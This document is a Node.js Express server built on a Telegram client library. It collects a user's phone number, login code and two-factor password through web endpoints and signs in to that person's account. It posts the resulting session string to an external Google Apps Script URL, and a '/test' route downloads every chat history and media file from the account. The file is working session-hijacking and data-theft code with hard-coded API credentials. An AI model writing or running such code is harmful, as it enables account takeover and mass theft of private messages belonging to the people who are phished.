import express from "express";
import { TelegramClient,password } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import { Api } from "telegram/tl/index.js";
import fetch from "node-fetch";

import fs from 'fs';
import path from 'path';  

const SESSION_FILE = "session.txt";

const app = express();
app.use(express.json());

app.use(express.static("public"));

const apiId = 28293438; 
const apiHash = "ff60c6e27b7828b5fdc9795bdd2230d8"; 

const userStates = {}; 

console.log("Telegram client started.");


app.post("/sendCode", async (req, res) => {
  try {
   const phoneNumber = req.body.phone;
   const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
   connectionRetries: 5,
   serverAddress: '149.154.167.99',  // DC5 IP
    port: 443,
    ipv6: false
  });

   await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({
          allow_flashcall: false,
          current_number: false,
          allow_app_hash: true,
        }),
      })
    );

    userStates[phoneNumber] = {
      phoneCodeHash: result.phoneCodeHash,
      client
    };

    res.json({ ok: true, phoneCodeHash: result.phoneCodeHash });
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.post("/checkCode", async (req, res) => {
  try {
    const code = req.body.code;
    const phoneNumber = req.body.phone;
    
    const state = userStates[phoneNumber];
    
    if (!state) return res.status(400).json({ ok: false, error: "Send code first" });
   
    const { client, phoneCodeHash} = state;

    const result = await client.invoke(
      new Api.auth.SignIn({
        phoneNumber,
        phoneCodeHash,
        phoneCode: code,
      })
    );


    if (result.className === "auth.AuthorizationSignUpRequired") {
      return res.json({ ok: false, error: "Требуется регистрация" });
    }
    
    const sessionString = client.session.save();
    await saveSessionToSheet(phoneNumber, sessionString);

    res.json({ ok: true, msg: "Signed in", user: result });
  } catch (err) {
        if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
      return res.json({ ok: false, needPassword: true });
    }

    res.json({ ok: false, error: err.message });
  }
});



app.post("/checkPassword", async (req, res) => {
  try {

    const pwd = req.body.password;
    const phone = req.body.phone;

    const state = userStates[phone];
    const { client } = state;

    const pwdInfo  = await client.invoke(new Api.account.GetPassword());
    const srp = await password.computeCheck(pwdInfo, pwd);

    if (!pwd) return res.status(400).json({ ok: false, error: "Phone and password required" });


    if (!srp) {
      throw new Error("SRP generation failed");
    }

    const result = await client.invoke(
      new Api.auth.CheckPassword({
        password: new Api.InputCheckPasswordSRP({
          srpId: srp.srpId,
          A: srp.A,
          M1: srp.M1,
        }),
      })
    );

    const sessionString = client.session.save();
    await saveSessionToSheet(phone, sessionString);

    res.json({ ok: true, result });

  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});


app.post("/checkSession", async (req, res) => {
  try {
    const phone = req.body.phone;
    const sessionString = await loadSessionFromSheet(phone);

    if (!sessionString) {
      return res.json({ ok: true, active: false, message: "Session not found" });
    }

    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, {
      connectionRetries: 5,
    });
    await client.connect();

    try {
      const me = await client.getMe();

      userStates[phone] = {
      client
    };

      res.json({ ok: true, active: true, message: "Session is active" });
    } catch (err) {
       if (userStates[phone]) {
          delete userStates[phone];
        }     
      res.json({ ok: true, active: false, message: "Session is outdated" });
    }

  } catch (err) {
    res.json({ ok: false, active: false, error: err.message });
  }
});



async function saveSessionToSheet(phone, session) {
  const response = await fetch("https://script.google.com/macros/s/AKfycbxH39mwEeJtrKEZCrbr8rPpUP1CrPu_oZ9LwKo3P_wwOvGcGF4xf2eOn6tJAsh0pnvJJg/exec", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ phone, session })
  });
  const data = await response.json();
  console.log("Session saved:", data);
}

async function loadSessionFromSheet(phone) {
  const response = await fetch("https://script.google.com/macros/s/AKfycbxH39mwEeJtrKEZCrbr8rPpUP1CrPu_oZ9LwKo3P_wwOvGcGF4xf2eOn6tJAsh0pnvJJg/exec");
  const data = await response.json();

  const record = data.find(r => r.phone === phone);
  if (!record) return "";

  return record.session;
}

app.post("/test", async (req, res) => {
  try {
   const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
   connectionRetries: 5,});

  await client.connect();

(async () => {
  
  const me = await client.getMe();
  const phone = me.phoneNumber || 'unknown';
  const username = me.username ? `@${me.username}` : '';
  
  const dateStr = new Date().toISOString().slice(0, 10).replace(/-/g, '-');
  const timeStr = new Date().toISOString().slice(11, 19).replace(/:/g, '-');
  const userFolder = `${dateStr}_${timeStr}_user_${phone.replace(/\+/g, '')}${username}`;
  const baseDir = path.join('downloads', userFolder);
  fs.mkdirSync(baseDir, { recursive: true });
  
  console.log(`🔥 Користувач: ${me.firstName} ${username} (${phone})`);
  console.log(`📁 Зберігаємо в: ${userFolder}/`);

  const allDialogs = await client.getDialogs({});
  console.log(`📊 ЗНАЙДЕНО ${allDialogs.length} ЧАТІВ`);

  const queue = [...allDialogs];
  let running = 0;
  const maxParallel = 3;


  const quickRenameAfterDownload = async (filePath, msgId, msgDate) => {
    try {

      const buffer = fs.readFileSync(filePath, { encoding: null }).slice(0, 20);
      let ext = path.extname(filePath).slice(1) || 'bin';
      

      if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) ext = 'jpg';
      else if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47) ext = 'png';
      else if (buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38) ext = 'gif';
      else if (buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46 && 
               buffer[8] === 0x57 && buffer[9] === 0x45 && buffer[10] === 0x42 && buffer[11] === 0x50) ext = 'webp';
      else if (buffer[0] === 0x25 && buffer[1] === 0x50 && buffer[2] === 0x44 && buffer[3] === 0x46) ext = 'pdf';
      else if (buffer[0] === 0x50 && buffer[1] === 0x4B) ext = 'zip';
      else if (buffer[4] === 0x66 && buffer[5] === 0x74 && buffer[6] === 0x79 && buffer[7] === 0x70) ext = 'mp4';
      else if (buffer[0] === 0xFF && (buffer[1] & 0xF0) === 0xF0) ext = 'mp3';
      else if (buffer[0] === 0x49 && buffer[1] === 0x44 && buffer[2] === 0x33) ext = 'mp3';
      else if (buffer[0] === 0x42 && buffer[1] === 0x4D) ext = 'bmp';
      

      const timestamp = new Date(msgDate * 1000).toISOString().replace(/[:.]/g, '-');
      const newName = `${msgId}_${timestamp}.${ext}`;
      const newPath = path.join(path.dirname(filePath), newName);
      
      if (path.basename(filePath) !== newName) {
        fs.renameSync(filePath, newPath);
        console.log(`✅ ${newName}`);
      }
      
      return true;
    } catch (e) {
      console.log(`⚠️ Помилка перейменування ${path.basename(filePath)}`);
      return false;
    }
  };

  const downloadOneChat = async () => {
    while (queue.length > 0) {
      const dialog = queue.shift();
      if (!dialog?.entity) continue;
      
      const entity = dialog.entity;
      const chatId = entity.id.value;
      let title = entity.title || '';
      if (entity.className === 'User' && !title) {
        title = `user_${entity.firstName || 'unknown'}_${chatId}`;
      } else {
        title = title || `chat_${chatId}`;
      }
      title = title.replace(/[\/\\:*?"<>|]/g, '_');
      
      const folder = path.join(baseDir, title);
      const mediaFolder = path.join(folder, 'media');
      fs.mkdirSync(mediaFolder, { recursive: true });

      const progress = allDialogs.length - queue.length;
      console.log(`\n[${progress}/${allDialogs.length}] 📂 ${title}`);

      try {
        const messages = [];
        let offsetId = 0;
        const limit = 100;


        while (true) {
          const history = await client.invoke(new Api.messages.GetHistory({
            peer: entity,
            offsetId,
            offsetDate: 0,
            addOffset: 0,
            limit,
            maxId: 0,
            minId: 0,
            hash: 0
          }));

          if (!history.messages.length) break;
          messages.push(...history.messages);
          offsetId = history.messages[history.messages.length - 1].id;
          await new Promise(r => setTimeout(r, 250));
        }

        if (messages.length === 0) continue;

     
        const cleanMessages = messages.map(m => ({
          id: m.id,
          date: new Date(m.date * 1000).toISOString(),
          text: m.message || '',
          hasMedia: !!m.media
        }));
        fs.writeFileSync(path.join(folder, 'history.json'), JSON.stringify(cleanMessages, null, 2));

  
        let mediaCount = 0;
        const mediaMessages = messages.filter(m => m.media);
        console.log(`  📥 Завантажую ${mediaMessages.length} файлів...`);
        
        for (const msg of mediaMessages) {
          try {
      
            const tmpName = `${msg.id}_${Date.now()}.tmp`;
            const tmpPath = path.join(mediaFolder, tmpName);
            await client.downloadMedia(msg, { outputFile: tmpPath });
            
    
            await quickRenameAfterDownload(tmpPath, msg.id, msg.date);
            mediaCount++;
            
           
            if (mediaCount % 10 === 0) {
              console.log(`  📁 ${mediaCount}/${mediaMessages.length} файлів...`);
            }
          } catch (e) {
            console.log(`  ❌ Файл ${msg.id}: ${e.message}`);
          }
          
          await new Promise(r => setTimeout(r, 150)); 
        }

        console.log(`✅ ${title}: ${messages.length} повідомлень, ${mediaCount} файлів`);
      } catch (e) {
        console.log(`❌ ${title}: ${e.message}`);
      }

      await new Promise(r => setTimeout(r, 1000));
    }
    running--;
  };

 
  for (let i = 0; i < maxParallel; i++) {
    running++;
    downloadOneChat();
  }

  while (running > 0) {
    await new Promise(r => setTimeout(r, 3000));
  }

  console.log(`\n🎉 ВСЕ ГОТОВО! 📁 ${userFolder}`);
  console.log(`✅ ВСІ ФАЙЛИ ОДРАЗУ З ПРАВИЛЬНИМИ РОЗШИРЕННЯМИ!`);
  
  await client.disconnect();
})();

  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

function getExt(media) {
  if (media.className === 'MessageMediaPhoto') return 'jpg';
  if (media.document?.mimeType?.includes('video')) return 'mp4';
  if (media.document?.mimeType?.includes('audio')) return 'mp3';
  if (media.document?.mimeType?.includes('image')) return 'jpg';
  return 'file';
}

app.listen(3000, () => console.log("Server running on 3000"));
